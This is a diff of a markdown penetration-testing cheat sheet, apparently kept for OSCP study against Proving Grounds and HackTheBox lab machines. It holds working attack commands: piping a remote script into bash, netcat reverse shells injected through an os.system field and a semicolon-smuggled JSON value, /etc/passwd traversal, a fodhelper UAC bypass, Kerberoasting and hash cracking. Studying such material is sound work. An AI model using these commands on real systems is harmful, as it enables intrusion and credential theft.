@@ -3,9 +3,8 @@
   - [Important Files](#important-files)
   - [Reverse Shell](#reverse-shell)
   - [UAC Bypass](#uac-bypass)
-- [PG Grounds & HTB]
+- [PG Grounds & HTB](#pg-grounds-&-htb)
   - [Linux Boxes](#linux-boxes)
-
 - [SQL](#sql)
   - [MYSQL](#mysql)
   - [SQLi](#sqli)
@@ -15,18 +14,28 @@
   - [nikto](#nikto)
   - [wfuzz](#wfuzz)
   - [ffuf](#ffuf)
+  - [curl](#curl)
   - [wget](#wget)
   - [Python](#python)
-  - [hashcat](#hashcat)
+  - [Hashcat](#hashcat)
+  - [John The Ripper](#john-the-ripper)
   - [pspy](#pspy)
   - [Cross Compiling](#cross-compiling)
   - [xfreerdp](#xfreerdp)
-  - [hashcat](#hashcat)
+  - [rdesktop](#rdesktop)
+  - [Rubeus](#rubeus)
+  - [Impacket](#impacket)
   - [Invoke-RunasCs.ps1](#invoke-runascs.ps1)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
 - [Web Attacks](#web-attacks)
+  - [Checklist](#checklist)
+  - [General Tips](#general-tips)
+  - [API Response](#api-response)
+  - [Filemanater](#filemanager)
+  - [Input Form](#input-form)
+  - [Directory Traversal](#directory-traversal)
   - [Local File Inclusion](#local-file-inclusion)
   - [PHP File Upload Bypass](#php-file-upload-bypass)
 - [SMB](#smb)
@@ -36,8 +45,6 @@
   - [Service DLL Hijacking](#service-dll-hijacking)
   - [Unquoted Service Paths](#unquoted-service-paths)
   - [Scheduled Tasks](#scheduled-tasks)
-  - [SeImpersonatePrivilege](#seimpersonateprivilege)
-  - [SeBackupPrivilege](#sebackupprivilege)
 - [Linux Privilege Escalation](#linux-privilege-escalation)
   - [Linux Manual Enumeration](#linux-manual-enumeration)
   - [Linux Privilege Strategy](#linux-privilege-strategy)
@@ -49,11 +56,10 @@
 # General
 ## Important Files
 - Windows
-
 ```bash
-
 C:/Users/Administrator/NTUser.dat
 ```
+
 - Linux
 ```bash
 /opt/*
@@ -111,9 +117,9 @@ reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
 fodhelper.exe
 ```
 
+# PG Grounds & HTB
+## Linux Boxes
 
-# Linux Boxes
-## Proving Grounds
 **Twiggy**
   Foothold:
     - curl -v http://192.168.x.x:3000/
@@ -310,18 +316,6 @@ nikto -h vulnerable_ip -Tuning 0
 nikto -h http://ip_address -o report.html
 ```
 
-
-### curl
-![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
-```bash
-# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
-We can find the stack information as well(ex. saltstack)
-curl -v target:port
-
-# directory traversal
-curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
-```
-
 ### wfuzz
 ```bash
 # Fuzz for any files we can find
@@ -337,12 +331,21 @@ wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/com
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://marshalled.pg -H 'Host: FUZZ.marshalled.pg' -fs 868
 ```
 
+### curl
+![image](https://github.com/nuricheun/OSCP/assets/14031269/83b00a36-8468-4e38-a5c9-3cf2eb68cbbd)
+```bash
+# -v : When the web page looks like above, use -v for debugging and getting extra information about the response from server
+We can find the stack information as well(ex. saltstack)
+curl -v target:port
+
+# directory traversal
+curl --path-as-is http://192.168.x.x/../../../../../../etc/passwd
+```
 
 ### wget
 ```bash
 # Download a file and execute it
 wget -O - http://192.168.45.175:443/lse.sh | bash
-
 ```
 
 ### Python
@@ -357,7 +360,19 @@ python3 -c 'import urllib.parse; original_string = "\n"; url_encoded_string = ur
 # $2a: 3200
 ($2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS)
 hashcat -m 3200 dora /usr/share/wordlists/rockyou.txt --force
+
+# search for mode
+hashcat -h | grep -i "kerberos"
+
+# TGS-REP
+hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force
 ```
+
+### John The Ripper
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt offsec.hash
+```
+
 
 ### pspy
 ```bash
@@ -377,11 +392,9 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 xfreerdp /u:administrator /p:qwertyuiop /v:10.3.26.190:3333 /cert:ignore
 ```
 
-### hashcat
+### rdesktop
 ```bash
-hashcat -h | grep -i "kerberos"
-# TGS-REP
-hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force
+rdesktop 192.168.216.165
 ```
 
 ### Rubeus
@@ -393,6 +406,11 @@ hashcat -m 13100 mssql /usr/share/wordlists/rockyou.txt --force
 ./Rubeus.exe asreproast  /format:hashcat /outfile:<FILE>
 ```
 
+### Impacket
+```bash
+
+```
+
 ### Invoke-RunasCs.ps1
 ```bash
 . .\Invoke-RunasCs.ps1
@@ -400,8 +418,10 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
 ```
 
+
+
 # SSH
-## SSH Keygen
+## SSH Key
 - See if other users can login as root using ssh key
 
 ```bash
@@ -453,8 +473,8 @@ ssh -N -R 9998 kali@192.168.118.4
 - Any .config, .conf files?
 - Combination with SQLi and other webpage that we know wehre its root location is
 
-## General Tips!
-- Try "Jetty exploit", "Jetty RCE"...
+## General Tips
+- Try "Jetty exploit", "Jetty RCE", "Jetty Remote Code Execution"...
 - Open the website and view page/page sources
   - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
   - feroxbuster
@@ -469,7 +489,7 @@ ssh -N -R 9998 kali@192.168.118.4
 - WAF bypass: X-Forwarded-For:127.0.0.1
 - When we're dealing with python server, see if we can use os module and send "nc 192.168.45.175 80 -e /bin/sh" when we find data entry
 
-## When it's api response
+## API Response
 ```bash
 # curl -v can give you more information about this api
 curl -v http://192.168.x.x:port
@@ -483,12 +503,12 @@ curl -X post --data "code=os.system('nc 192.168.45.175 80 -e /bin/sh')" http://1
 curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;nc 192.168.45.175 80 -e /bin/bash"}' -H 'Content-Type: application/json'  http://192.168.222.134:13337/update
 ```
 
-## When it's using Filemanater
+## Filemanager
 - See if any directory is showing same contents as ohter ports like FTP, SMB
 - If our key file we should obtain is php file, we can't read it on the web so likely that we need to transfer it to FTP,SMB so make sure if any directory can be searched through smb/ftp
 - When we're changing download path, try ./Documents/ or /Documents/ or Documents/
 
-## Input form
+## Input Form
 - SQLi? Command injection?
 - Try with GET request
   - http://192.168.x.x/api?var=whoami
@@ -505,12 +525,10 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 - Check other user's home directories to see the name of the files(pg practice cassandra)
 - If wget doesn't work, maybe it only requires very simple way to get through: such as pivot as other users)
 
-
 ## Local File Inclusion
 - Make sure to check "important files" list
 - Make sure to see what files we can find using wfuzz on our current location
   - Make sure to check file extension(.py, .js, .conf, .config...)
-
 ```bash
 # Local File Inclusion...
 wfuzz -c --sc 200,301 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'X-Forwarded-For:127.0.0.1' http://192.168.222.134:13337/logs?file=./FUZZ.py
@@ -532,11 +550,6 @@ crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
 crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
 crackmapexec smb 10.10.10.175 -u "fsmith" -p "Thestrokes23" -d Egotistical-bank.local
 crackmapexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -d Egotistical-bank.local
-
-
-# rdesktop
-rdesktop 192.168.216.165
-
 
 # smbclient
 ## anon
@@ -606,10 +619,8 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/ -usersfile usernames.txt
 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
 
-
 # Kerberoast(requires valid credentials) 13100
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
-
 
 ## hashcat
 hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
@@ -623,7 +634,6 @@ bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPs
 # Windows Privilege Escalation
 
 ## Manual Enumeration
-
 ```bash
 #User information&hostname
 whoami
@@ -736,8 +746,6 @@ Get-Process
 ## Unquoted Service Paths
 ```bash
 ```
-
-## SeImpersonatePrivilege
 
 # Linux Privilege Escalation
 ## Linux Manual Enumeration
